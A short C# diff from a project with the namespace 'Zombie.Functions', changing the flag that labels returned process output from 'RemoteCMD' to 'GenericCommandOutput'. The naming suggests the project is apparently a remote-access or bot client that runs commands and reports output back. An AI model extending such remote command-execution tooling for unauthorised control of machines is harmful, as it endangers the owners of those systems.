@@ -88,7 +88,7 @@ namespace Zombie.Functions
 
             pProcess.Dispose();
 
-            return CommandDataSerializer.Serialize(CommandFlags.RemoteCMD, writer => writer.Write(commandOutput));
+            return CommandDataSerializer.Serialize(CommandFlags.GenericCommandOutput, writer => writer.Write(commandOutput));
 
         }
 
